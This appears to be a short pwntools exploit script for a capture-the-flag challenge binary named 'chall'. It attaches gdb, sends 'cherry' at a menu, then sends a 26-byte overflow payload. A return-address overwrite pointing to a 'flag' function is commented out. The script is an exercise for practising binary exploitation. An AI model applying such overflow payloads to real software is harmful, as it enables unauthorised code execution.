#!/bin/python
from pwn import *
exe = ELF('./chall')

p = process(exe.path)
context.terminal = ['alacritty', '-e']
gdb.attach(p, gdbscript='''
#b*main+185

           ''')
#################exploiting#####################
payload = b'cherry'


p.sendlineafter(b'Menu: ',payload)
payload = b'a'*26 

#+ p64(exe.sym['flag'])

p.sendlineafter(b's it cherry?: ',payload)











##############the end###########################
p.interactive()
